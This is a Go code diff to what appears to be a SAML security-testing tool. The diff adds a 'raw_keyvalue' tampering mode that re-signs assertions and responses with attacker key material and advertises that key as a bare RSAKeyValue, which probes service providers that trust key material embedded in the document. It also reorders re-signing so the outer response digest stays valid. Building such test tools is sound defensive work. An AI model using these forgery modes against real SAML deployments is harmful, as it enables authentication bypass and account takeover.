@@ -45,6 +45,11 @@ const (
 	// SignKeyStripKeyInfo removes KeyInfo entirely. A correct SP falls back to
 	// its configured certificate and still validates.
 	SignKeyStripKeyInfo = "strip_keyinfo"
+	// SignKeyRawKeyValue signs with attacker key material and advertises that
+	// key as a bare ds:RSAKeyValue instead of a certificate. An SP that hands
+	// the document's key material to its verifier, rather than restricting the
+	// verifier to the certificate it was configured with, accepts it.
+	SignKeyRawKeyValue = "raw_keyvalue"
 )
 
 // SignKeyModes lists the modes in the order the tamper page offers them.
@@ -55,6 +60,7 @@ var SignKeyModes = []string{
 	SignKeyNotYetValid,
 	SignKeyRogueKeyInfo,
 	SignKeyStripKeyInfo,
+	SignKeyRawKeyValue,
 }
 
 // SignKeyModeLabels are the human-readable names shown in the UI and recorded
@@ -66,6 +72,7 @@ var SignKeyModeLabels = map[string]string{
 	SignKeyNotYetValid:  "not-yet-valid certificate",
 	SignKeyRogueKeyInfo: "rogue certificate in KeyInfo",
 	SignKeyStripKeyInfo: "KeyInfo removed",
+	SignKeyRawKeyValue:  "attacker key advertised as a bare RSAKeyValue",
 }
 
 func IsSignKeyMode(mode string) bool {
@@ -125,7 +132,7 @@ func (r *Resigner) materialFor(mode string) (*signMaterial, error) {
 	}
 
 	switch mode {
-	case SignKeyUntrusted, SignKeyRogueKeyInfo:
+	case SignKeyUntrusted, SignKeyRogueKeyInfo, SignKeyRawKeyValue:
 		serial, err := randomSerial()
 		if err != nil {
 			return nil, err
@@ -198,12 +205,14 @@ func (r *Resigner) Apply(xmlBytes []byte, mode string) ([]byte, string, error) {
 
 	// Both the response and the assertion may carry a signature; whichever are
 	// present get the same treatment, so the SP cannot fall back to the other.
+	// The assertion comes first: a response signature covers the assertion, so
+	// rewriting the assertion afterwards would leave the outer digest stale.
 	targets := []*etree.Element{}
-	if findSignature(response) != nil {
-		targets = append(targets, response)
-	}
 	if assertion := findElement(response, "saml", "Assertion"); assertion != nil && findSignature(assertion) != nil {
 		targets = append(targets, assertion)
+	}
+	if findSignature(response) != nil {
+		targets = append(targets, response)
 	}
 	if len(targets) == 0 {
 		return nil, "", fmt.Errorf("response carries no signature to replace")
@@ -220,6 +229,11 @@ func (r *Resigner) Apply(xmlBytes []byte, mode string) ([]byte, string, error) {
 			stripKeyInfo(el)
 		case SignKeyRogueKeyInfo:
 			replaceKeyInfoCert(el, material.cert)
+		case SignKeyRawKeyValue:
+			if err := resignElement(el, material); err != nil {
+				return nil, "", err
+			}
+			replaceKeyInfoWithRawKey(el, &material.key.PublicKey)
 		default:
 			if err := resignElement(el, material); err != nil {
 				return nil, "", err
@@ -233,7 +247,7 @@ func (r *Resigner) Apply(xmlBytes []byte, mode string) ([]byte, string, error) {
 	}
 
 	desc := SignKeyModeLabels[mode]
-	if mode != SignKeyStripKeyInfo {
+	if mode != SignKeyStripKeyInfo && mode != SignKeyRawKeyValue {
 		desc += " (sha256 " + fingerprint(material.cert)[:16] + "…)"
 	}
 	return out, desc, nil
@@ -296,6 +310,22 @@ func stripKeyInfo(el *etree.Element) {
 	if keyInfo := findElement(sig, "ds", "KeyInfo"); keyInfo != nil {
 		sig.RemoveChild(keyInfo)
 	}
+}
+
+// replaceKeyInfoWithRawKey swaps the certificate in KeyInfo for the bare RSA
+// public key. KeyInfo sits outside SignedInfo, so the signature stays intact.
+func replaceKeyInfoWithRawKey(el *etree.Element, pub *rsa.PublicKey) {
+	sig := findSignature(el)
+	if sig == nil {
+		return
+	}
+	if keyInfo := findElement(sig, "ds", "KeyInfo"); keyInfo != nil {
+		sig.RemoveChild(keyInfo)
+	}
+	keyInfo := sig.CreateElement("ds:KeyInfo")
+	rsaKey := keyInfo.CreateElement("ds:KeyValue").CreateElement("ds:RSAKeyValue")
+	rsaKey.CreateElement("ds:Modulus").SetText(base64.StdEncoding.EncodeToString(pub.N.Bytes()))
+	rsaKey.CreateElement("ds:Exponent").SetText(base64.StdEncoding.EncodeToString(big.NewInt(int64(pub.E)).Bytes()))
 }
 
 func replaceKeyInfoCert(el *etree.Element, cert *x509.Certificate) {
